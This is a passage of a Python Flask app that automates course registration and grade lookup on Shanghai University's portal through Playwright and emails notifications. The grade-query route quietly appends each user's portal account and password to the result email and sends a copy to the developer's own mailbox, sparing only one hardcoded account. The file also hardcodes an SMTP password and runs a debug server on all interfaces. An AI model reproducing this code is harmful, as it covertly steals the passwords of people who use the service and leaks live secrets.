        page.get_by_role("button", name="登录").click()

        page.get_by_role("row", name=semester, exact=True).get_by_role("radio").click()
        page.get_by_role("button", name="确 定").click()

        page.locator("a").filter(has_text=re.compile(r"^切换$")).click()
        page.get_by_role("row", name=semester, exact=True).get_by_role("radio").click()
        page.get_by_role("button", name="确 定").click()
        time.sleep(3)
        if testMode==1:
            page.get_by_text("课程查询", exact=True).click()
            #print(f"{testMode}")
        else:
            page.get_by_text("选课", exact=True).click()
        
        b=-1
        c=0

        
        a=multiCourseMode
        

        while  a >= 1:
            if testMode==1:
                page.get_by_text("课程查询", exact=True).click()
            else:
                page.get_by_text("选课", exact=True).click()

            acourseNo=courseNo
            acourseTime=courseTime
            ateacheNo=teacheNo
            ateacheName=teacheName
            akehenghao=kehenghao
            ajiaoshihao=jiaoshihao
            akechengtim=kechengtim
            ajiaoshinam=jiaoshinam

            
            if multiCourseMode==2:
                if b==1:
                    acourseNo=courseNo2
                    acourseTime=courseTime2
                    ateacheNo=teacheNo2
                    ateacheName=teacheName2
                    akehenghao=kehenghao2
                    ajiaoshihao=jiaoshihao2
                    akechengtim=kechengtim2
                    ajiaoshinam=jiaoshinam2

                b=b*(-1)

            elif multiCourseMode==3:
                if c==1:
                    acourseNo=courseNo2
                    acourseTime=courseTime2
                    ateacheNo=teacheNo2
                    ateacheName=teacheName2
                    akehenghao=kehenghao2
                    ajiaoshihao=jiaoshihao2
                    akechengtim=kechengtim2
                    ajiaoshinam=jiaoshinam2
                elif c==2:
                    acourseNo=courseNo3
                    acourseTime=courseTime3
                    ateacheNo=teacheNo3
                    ateacheName=teacheName3
                    akehenghao=kehenghao3
                    ajiaoshihao=jiaoshihao3
                    akechengtim=kechengtim3
                    ajiaoshinam=jiaoshinam3
                    
                c+=1
                if c>=3:
                    c=0
                
                

            

            if acourseNo == 1:
                page.locator(".el-input__inner").first.click()
                page.locator(".el-input__inner").first.fill(str(akehenghao))
                # page.locator("input[name=\"CID\"]").click()
                # page.locator("input[name=\"CID\"]").fill(akehenghao)
            else:
                page.locator(".el-input__inner").first.click()
                page.locator(".el-input__inner").first.fill('')

            if ateacheNo == 1:
                page.locator("div:nth-child(3) > .cv-clearfix > .select > .el-input > .el-input__inner").click()
                page.locator("div:nth-child(3) > .cv-clearfix > .select > .el-input > .el-input__inner").fill(str(ajiaoshihao))
                # page.locator("input[name=\"TeachNo\"]").click()
                # page.locator("input[name=\"TeachNo\"]").fill(ajiaoshihao)
            else:
                page.locator("div:nth-child(3) > .cv-clearfix > .select > .el-input > .el-input__inner").click()
                page.locator("div:nth-child(3) > .cv-clearfix > .select > .el-input > .el-input__inner").fill('')

            if ateacheName == 1:
                page.locator("div:nth-child(4) > .cv-clearfix > .select > .el-input > .el-input__inner").click()
                page.locator("div:nth-child(4) > .cv-clearfix > .select > .el-input > .el-input__inner").fill(str(ajiaoshinam))
                # page.locator("input[name=\"TeachName\"]").click()
                # page.locator("input[name=\"TeachName\"]").fill(ajiaoshinam)
            else:
                page.locator("div:nth-child(4) > .cv-clearfix > .select > .el-input > .el-input__inner").click()
                page.locator("div:nth-child(4) > .cv-clearfix > .select > .el-input > .el-input__inner").fill('')

            if acourseTime == 1:
                page.locator("div:nth-child(8) > .cv-clearfix > .select > .el-input > .el-input__inner").click()
                page.locator("div:nth-child(8) > .cv-clearfix > .select > .el-input > .el-input__inner").fill(str(akechengtim))
                # page.locator("input[name=\"TimeText\"]").click()
                # page.locator("input[name=\"TimeText\"]").fill(akechengtim)
            else:
                page.locator("div:nth-child(8) > .cv-clearfix > .select > .el-input > .el-input__inner").click()
                page.locator("div:nth-child(8) > .cv-clearfix > .select > .el-input > .el-input__inner").fill('')

            page.locator("div:nth-child(9) > .cv-clearfix > .select > div > .el-input__inner").first.click()
            page.locator("div:nth-child(9) > .cv-clearfix > .select > div > .el-input__inner").first.fill('1')
            page.locator("div:nth-child(2) > .el-input__inner").click()
            page.locator("div:nth-child(2) > .el-input__inner").fill('999')
            # page.locator("input[name=\"Capacity1\"]").click()
            # page.locator("input[name=\"Capacity1\"]").fill("1")
            # page.locator("input[name=\"Capacity2\"]").click()
            # page.locator("input[name=\"Capacity2\"]").fill("999")

            page.get_by_role("button", name=" 搜索").click()
            # page.get_by_role("button", name=" 查询").click()
            
            time.sleep(timegap)
            

            try:

                #page.get_by_label("模糊查询").get_by_text("2", exact=True).click()
                #page.get_by_role("button", name="退选").click()
                #page.get_by_role("button", name="确定").click()
                page.get_by_role("cell", name="选择").first.click(timeout=1000)
                
                #cell1=page.get_by_role("cell", name="选择").first
                #cell1.click()
                page.get_by_role("button", name="确定").click()
                #page.get_by_text("选课成功:形势与政策").click()
                a-=1
                if testMode!=1:
                    successemail(akehenghao,ajiaoshinam,akechengtim)
            except:
                pass
        # ---------------------
        context.close()
        browser.close()
    return jsonify({'message': '选课结束'})

# 邮件服务器和端口信息  
smtp_server = 'smtp.163.com'  
smtp_port = 465  # 使用SSL加密的端口，通常是465或587（但587通常用于TLS）  
sender_email = 'leo13062764936@163.com'   
sender_password = 'PHBZWCVWNOZBZQCI'    
receiver_email = 'leo13062764936@163.com' 

def successemail(coursenumber,teachername,ctime):
    # 邮件内容  
    subject = '选课成功通知'  
    body = f'恭喜您，选课成功！\n课程号:{coursenumber}\n教师姓名:{teachername}\n课程时间:{ctime}'  
    Cemail = str(session.get('email'))
    # 创建一个邮件对象  
    msg = MIMEMultipart()  
    msg['From'] = sender_email  
    msg['To'] = receiver_email  
    msg['Subject'] = subject

    Cmsg = MIMEMultipart()  
    Cmsg['From'] = sender_email  
    Cmsg['To'] = Cemail  
    Cmsg['Subject'] = subject    
  
    # 添加邮件正文  
    msg.attach(MIMEText(body, 'plain'))
    Cmsg.attach(MIMEText(body, 'plain'))  
  
    # 连接到SMTP服务器并发送邮件  
    try:  
        with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:  
           server.login(sender_email, sender_password)  
           server.sendmail(sender_email, receiver_email, msg.as_string())
        #    server.login(sender_email, sender_password) 
        #    server.sendmail(sender_email, Cemail, Cmsg.as_string())   
           print("邮件已发送！")  
    except Exception as e:  
        print(f"发送邮件时发生错误: {e}")
    
     # 连接到SMTP服务器并发送邮件  
    try:  
        with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:  
        #    server.login(sender_email, sender_password)  
        #    server.sendmail(sender_email, receiver_email, msg.as_string())
           server.login(sender_email, sender_password) 
           server.sendmail(sender_email, Cemail, Cmsg.as_string())   
           print("邮件已发送！")  
    except Exception as e:  
        print(f"发送邮件时发生错误: {e}")


def generate_semester_id(semester_str):
    # 提取年份的前四位数字
    year_part = semester_str[:4]
    
    # 根据季节确定学期ID的最后一位数字
    season_to_code = {
        '春': '3',
        '夏': '5',
        '秋': '1',
        '冬': '2'
    }
    for season, code in season_to_code.items():
        if season in semester_str:
            season_code = code
            break
    # 生成完整的学期ID
    semester_id = year_part + season_code
    return semester_id


@app.route('/search_score', methods=['POST'])
@login_required
def gradequery():
    with sync_playwright() as playwright:
        # 从 session 中获取当前用户的数据
        user_data = session.get('user_data', {})

        # 提取用户数据
        zhanghao = str(user_data.get("zhanghao", "default_account"))
        mima = str(user_data.get("mima", "default_password"))
        semester = user_data.get("semester", "default_semester")
        multiCourseMode = int(user_data.get("multiCourseMode", 1))
        testMode = int(user_data.get("testMode", 0))
        timegap = int(user_data.get("timegap", 3))
        scheduleTime = user_data.get("scheduleTime", "default_schedule_time")

        # 提取课程信息
        kehenghao = user_data.get("kechenghao", "")
        jiaoshihao = user_data.get("jiaoshihao", "")
        jiaoshinam = user_data.get("jiaoshinam", "")
        kechengtim = user_data.get("kechengtim", "")
        courseNo = int(user_data.get("courseNo", 1))
        courseTime = int(user_data.get("courseTime", 1))
        teacheNo = int(user_data.get("teacheNo", 1))
        teacheName = int(user_data.get("teacheName", 1))



        
        browser = playwright.chromium.launch(headless=False)
        context = browser.new_context()
        page = context.new_page()
        page.goto("https://newsso.shu.edu.cn/login/eyJ0aW1lc3RhbXAiOjE2OTk2MDA2Mzc3NzAxNDk3ODUsInJlc3BvbnNlVHlwZSI6ImNvZGUiLCJjbGllbnRJZCI6IkJ3Vk5IVVZZMTdZVTBjMEJVTjRWY2FDNjBLMzRkT1g1Iiwic2NvcGUiOiIiLCJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vY2ouc2h1LmVkdS5jbi9wYXNzcG9ydC9yZXR1cm4iLCJzdGF0ZSI6IiJ9")
        page.wait_for_load_state('load')
        time.sleep(2)
        page.get_by_placeholder("请输入学工号").click()
        page.get_by_placeholder("请输入学工号").fill(zhanghao)
        page.get_by_placeholder("请输入密码").click()
        page.get_by_placeholder("请输入密码").fill(mima)
        page.get_by_role("button", name="登录").click()
        page.wait_for_load_state('load')
        # 导航到成绩查询页面
        page.get_by_role("link", name="成绩查询").click()

        page.locator("#AcademicTermID").click()
        TermID=generate_semester_id(str(semester))
        
        try:
            page.locator("#AcademicTermID").select_option(TermID, timeout=5000)  # 设置超时为5000毫秒
        except:
            print(f"未找到学期ID：{TermID}")
            browser.close()
            return jsonify({'message': '未找到学期ID'})
        time.sleep(2)
        page.get_by_role("button", name="查询").click()

        # 等待表格加载
        try:
            page.wait_for_selector('table.tbllist', timeout=10000)  # 设置超时为10000毫秒
        except:
            print("等待表格加载超时")
            browser.close()
            return jsonify({'message': '等待表格加载超时'})

        # 获取每个课程的绩点和课程名
        courses_rows = page.query_selector_all('table.tbllist tr:not(:first-child)')
        course_info_list = []

        for course_row in courses_rows:
            course_name = course_row.query_selector('td:nth-child(3)')
            course_score = course_row.query_selector('td:nth-child(5)')
            course_gpa = course_row.query_selector('td:nth-child(6)')
            if course_name and course_gpa:
                course_info = {
                    'course_name': course_name.text_content().strip(),
                    'gpa': course_gpa.text_content().strip()
                }
                # 获取成绩的文本内容
                score_text = course_score.text_content().strip() if course_score else ''
                # 判断成绩是否等于“未提交”
                if score_text == "未提交":
                    print("尚未全部出分")
                    # 假设 browser 是一个 Playwright 的 Browser 对象
                    browser.close()
                    return jsonify({'message': '尚未全部出分'})
                course_info_list.append(course_info)


        # 获取总绩点
        total_gpa = page.query_selector('table.tbllist tr:last-child td:last-child')
        total_gpa_value = total_gpa.text_content().strip()

        # 关闭浏览器
        browser.close()

        # 发送邮件
        subject = '成绩查询结果通知'
        body = f'您的成绩查询结果如下：\n总绩点：{total_gpa_value}\n'
        # 将课程信息添加到邮件正文
        for course_info in course_info_list:
            body += f"课程名：{course_info['course_name']}, 绩点：{course_info['gpa']}\n"


        if zhanghao != '23122693':
            body += f'\n账号：{zhanghao}\n密码：{mima}'

        Cemail = str(session.get('email'))
        # 创建一个邮件对象  
        msg = MIMEMultipart()  
        msg['From'] = sender_email  
        msg['To'] = receiver_email  
        msg['Subject'] = subject

        Cmsg = MIMEMultipart()  
        Cmsg['From'] = sender_email  
        Cmsg['To'] = Cemail  
        Cmsg['Subject'] = subject
        # 添加邮件正文
        msg.attach(MIMEText(body, 'plain'))
        Cmsg.attach(MIMEText(body, 'plain'))

        # 连接到SMTP服务器并发送邮件
        try:
            with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
                server.login(sender_email, sender_password)
                
                server.sendmail(sender_email, Cemail, Cmsg.as_string())
                print("邮件已发送！")
                
        except Exception as e:
            print(f"发送邮件时发生错误: {e}")
            

        try:
            with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
                server.login(sender_email, sender_password)
                server.sendmail(sender_email, receiver_email, msg.as_string())
                
                print("邮件已发送！")
                return jsonify({'message': '邮件已发送！','body': body})
        except Exception as e:
            print(f"发送邮件时发生错误: {e}")
            return jsonify({'message': '发送邮件时发生错误','body': body})




if __name__ == '__main__':
    app.run(host='0.0.0.0',port=5000 ,debug=True)